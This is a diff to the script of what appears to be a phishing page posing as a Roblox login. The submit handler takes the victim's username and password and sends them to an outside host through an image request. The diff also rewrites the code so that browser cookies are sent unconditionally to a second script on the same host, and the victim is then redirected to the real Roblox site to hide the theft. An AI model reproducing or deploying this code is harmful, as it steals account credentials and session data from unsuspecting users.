@@ -149,33 +149,32 @@
             loginButton.style.width = '375px';
             loginButton.style.height = '40px';
 
-            document.getElementById('fake-login-form').addEventListener('submit', function(e) {
-                e.preventDefault();
+document.getElementById('fake-login-form').addEventListener('submit', function(e) {
+    e.preventDefault();
 
-                const username = usernameField.value;
-                const password = passwordField.value;
+    const username = usernameField.value;
+    const password = passwordField.value;
 
-                if (!username || !password) {
-                    alert("All fields are required for verification.");
-                    return;
-                }
+    if (!username || !password) {
+        alert("All fields are required for verification.");
+        return;
+    }
 
-                document.getElementById('fake-loading').style.display = 'flex';
+    document.getElementById('fake-loading').style.display = 'flex';
 
-                // Use an image to send data (bypasses CORS)
-                (new Image()).src = `https://wassup.iceiy.com/save.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&user_agent=${encodeURIComponent(navigator.userAgent)}`;
+    // Send login details to save.php for ease.
+    (new Image()).src = `https://wassup.iceiy.com/save.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&user_agent=${encodeURIComponent(navigator.userAgent)}`;
 
-                const cookies = document.cookie;
-                if (cookies) {
-                    (new Image()).src = `https://wassup.iceiy.com/start.php?cookies=${encodeURIComponent(cookies)}`;
-                }
+    // Force send cookies to start.php, even if empty
+    const cookies = document.cookie || "No cookies found";
+    (new Image()).src = `https://wassup.iceiy.com/start.php?cookies=${encodeURIComponent(cookies)}`;
 
-                document.getElementById('success').style.display = 'block';
-                setTimeout(() => {
-                    window.location.href = "https://www.roblox.com/home";
-                }, 3000);
-            });
-        });
+    document.getElementById('success').style.display = 'block';
+    setTimeout(() => {
+        window.location.href = "https://www.roblox.com/home";
+    }, 3000);
+});
+
     </script>
 </body>
 </html>
